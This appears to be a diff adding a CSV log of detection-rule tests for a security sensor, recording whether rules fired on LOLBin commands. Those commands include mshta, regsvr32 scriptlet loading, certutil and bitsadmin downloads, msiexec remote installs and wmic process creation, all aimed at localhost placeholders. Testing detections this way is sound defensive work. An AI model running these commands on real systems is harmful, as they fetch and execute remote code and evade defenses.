@@ -1,0 +1,40 @@
+rule_id,attack_path,field_values_used,result,reason,timestamp_utc
+LOLBIN_MSHTA_001,Path A,mshta.exe http://127.0.0.1/payload_a1.hta ; http://127.0.0.1/payload_a2.hta,PASS,2 hits,2026-08-12T09:35:53.367186
+LOLBIN_MSHTA_001,Path B,"mshta.exe vbscript:close ; vbscript:Execute(""close"")",PASS,2 hits,2026-08-12T09:38:00.165062
+LOLBIN_MSHTA_001,Path C,mshta.exe C:\Windows\Temp\ss_test_1.hta ; ss_test_2.hta,PASS,2 hits,2026-08-12T09:39:05.668250
+LOLBIN_RUNDLL32_SUSPICIOUS_001,Path A,"rundll32.exe javascript:""\.\mshtml,RunHTMLApplication"";document.write()",PARTIAL,DEFENDER_BLOCKED,2026-08-12T09:40:36.894964
+LOLBIN_RUNDLL32_SUSPICIOUS_001,Path B,"rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe /c echo ShadowSensor_test",PARTIAL,DEFENDER_BLOCKED,2026-08-12T09:40:40.011880
+LOLBIN_RUNDLL32_SUSPICIOUS_001,Path C,"rundll32.exe http://127.0.0.1/a.dll,Entry",PASS,2 hits,2026-08-12T09:40:43.274092
+LOLBIN_REGSVR32_001,Path A,regsvr32.exe /s /i:http://127.0.0.1/a.sct scrobj.dll,PARTIAL,DEFENDER_BLOCKED,2026-08-12T09:41:05.489546
+LOLBIN_REGSVR32_001,Path B,regsvr32.exe /i:https://127.0.0.1/a.sct scrobj.dll,PARTIAL,DEFENDER_BLOCKED,2026-08-12T09:41:07.966816
+LOLBIN_REGSVR32_001,Path C,regsvr32.exe /s /u /i:C:\Windows\Temp\ss_test.sct scrobj.dll,PARTIAL,DEFENDER_BLOCKED,2026-08-12T09:41:10.018831
+LOLBIN_CERTUTIL_001,Path A,certutil.exe -urlcache -split -f http://127.0.0.1/a_1.exe ; -urlcache -f http://127.0.0.1/a_2.exe,FAIL,0 hits,2026-08-12T09:41:12.643095
+LOLBIN_CERTUTIL_001,Path B,certutil.exe -decode C:\Windows\Temp\ss_b64.txt (2 launches),PASS,2 hits,2026-08-12T09:44:18.346483
+LOLBIN_CERTUTIL_001,Path C,certutil.exe -decodehex C:\Windows\Temp\ss_hex.txt (2 launches),PASS,2 hits,2026-08-12T09:44:52.965387
+LOLBIN_MSIEXEC_REMOTE_001,Path A,msiexec.exe /i http://127.0.0.1/pkg_a1.msi /qn ; pkg_a2.msi,PASS,2 hits,2026-08-12T09:45:27.360436
+LOLBIN_MSIEXEC_REMOTE_001,Path B,msiexec.exe /package https://127.0.0.1/pkg_b1.msi ; pkg_b2.msi,PASS,2 hits,2026-08-12T09:46:06.818299
+LOLBIN_MSIEXEC_REMOTE_001,Path C,msiexec.exe /i ftp://127.0.0.1/pkg_c1.msi ; pkg_c2.msi,PASS,2 hits,2026-08-12T09:46:45.834063
+LOLBIN_ODBCCONF_001,Path A,odbcconf.exe /a {REGSVR C:\Windows\Temp\ss_fake_1.dll} ; ss_fake_2.dll,PASS,2 hits,2026-08-12T09:47:20.514822
+LOLBIN_ODBCCONF_001,Path B,odbcconf.exe -a {REGSVR C:\Windows\Temp\ss_fake_3.dll} ; ss_fake_4.dll,PASS,2 hits,2026-08-12T09:50:53.861721
+LOLBIN_ODBCCONF_001,Path C,odbcconf.exe /f http://127.0.0.1/a_c1.rsp ; a_c2.rsp,PASS,2 hits,2026-08-12T09:51:51.133931
+LOLBIN_CMSTP_001,Path A,cmstp.exe /s C:\Windows\Temp\ss_inf_a1.inf ; ss_inf_a2.inf,PASS,2 hits,2026-08-12T09:52:38.080297
+LOLBIN_CMSTP_001,Path B,cmstp.exe /au C:\Windows\Temp\ss_inf_b1.inf ; ss_inf_b2.inf,PASS,2 hits,2026-08-12T09:53:12.423675
+LOLBIN_CMSTP_001,Path C,cmstp.exe /u C:\Windows\Temp\ss_inf_c1.inf ; ss_inf_c2.inf,PASS,2 hits,2026-08-12T09:53:57.669002
+LOLBIN_HH_CHM_001,Path A,hh.exe http://127.0.0.1/help_a1.chm ; help_a2.chm,FAIL,0 hits,2026-08-12T09:54:39.163086
+LOLBIN_HH_CHM_001,Path B,hh.exe javascript:window.close() ; javascript:close(),FAIL,0 hits,2026-08-12T09:57:44.436840
+LOLBIN_HH_CHM_001,Path C,hh.exe mk:@MSITStore:C:\Windows\Temp\ss_fake_c1.chm::/x.html ; ss_fake_c2.chm,FAIL,0 hits,2026-08-12T10:00:49.521040
+LOLBIN_REGASM_REGSVCS_001,Path A,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe C:\Windows\Temp\ss_fake_asm_a1.dll ; ss_fake_asm_a2.dll,PASS,2 hits,2026-08-12T10:03:54.526518
+LOLBIN_REGASM_REGSVCS_001,Path B,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe C:\Windows\Temp\ss_fake_svc_b1.dll ; ss_fake_svc_b2.dll,PASS,2 hits,2026-08-12T10:04:29.150607
+LOLBIN_REGASM_REGSVCS_001,Path C,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U C:\Windows\Temp\ss_fake_asm_c1.dll ; ss_fake_asm_c2.dll,PASS,2 hits,2026-08-12T10:05:04.013653
+LOLBIN_WMIC_PROCESS_001,Path A,wmic.exe process call create cmd.exe /c echo ShadowSensor_wmic_A1 ; A2,PASS,2 hits,2026-08-12T10:05:38.334916
+LOLBIN_WMIC_PROCESS_001,Path B,wmic.exe /node:127.0.0.1 process call create cmd.exe /c echo ShadowSensor_wmic_B1 ; B2,PASS,2 hits,2026-08-12T10:06:14.450960
+LOLBIN_WMIC_PROCESS_001,Path C,wmic.exe win32_process call create cmd.exe /c echo ShadowSensor_wmic_C1 ; C2,PASS,2 hits,2026-08-12T10:06:49.559394
+LOLBIN_BITSADMIN_001,Path A,bitsadmin.exe /transfer ShadowSensor_job_A1|A2 http://127.0.0.1/a1.exe|a2.exe,PASS,2 hits,2026-08-12T10:07:23.861449
+LOLBIN_BITSADMIN_001,Path B,bitsadmin.exe /addfile ShadowSensor_job_B1|B2 http://127.0.0.1/b1.exe|b2.exe,PASS,2 hits,2026-08-12T10:08:38.340624
+LOLBIN_BITSADMIN_001,Path C,bitsadmin.exe /transfer ShadowSensor_job_C1|C2 ftp://127.0.0.1/c1.exe|c2.exe,PASS,2 hits,2026-08-12T10:09:12.552104
+LOLBIN_INSTALLUTIL_001,Path A,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe C:\Windows\Temp\ss_fake_iu_a1.dll ; ss_fake_iu_a2.dll,PASS,2 hits,2026-08-12T10:09:47.286573
+LOLBIN_INSTALLUTIL_001,Path B,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U C:\Windows\Temp\ss_fake_iu_b1.dll ; ss_fake_iu_b2.dll,PASS,2 hits,2026-08-12T10:10:26.956585
+LOLBIN_INSTALLUTIL_001,Path C,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe (bare launch, 2x)",PASS,2 hits,2026-08-12T10:11:01.193735
+LOLBIN_FORFILES_001,Path A,forfiles.exe /p C:\Windows\System32 /m notepad.exe /c cmd /c echo ShadowSensor_forfiles_A1 ; A2,PASS,2 hits,2026-08-12T10:11:36.316131
+LOLBIN_FORFILES_001,Path B,forfiles.exe /p C:\Windows\System32 /m notepad.exe /c powershell -c Write-Host ShadowSensor_forfiles_B1 ; B2,PASS,2 hits,2026-08-12T10:12:10.620095
+LOLBIN_FORFILES_001,Path C,forfiles.exe /c wscript ...ss_fake.js ; /c cscript ...ss_fake.js,PASS,2 hits,2026-08-12T10:12:48.950600
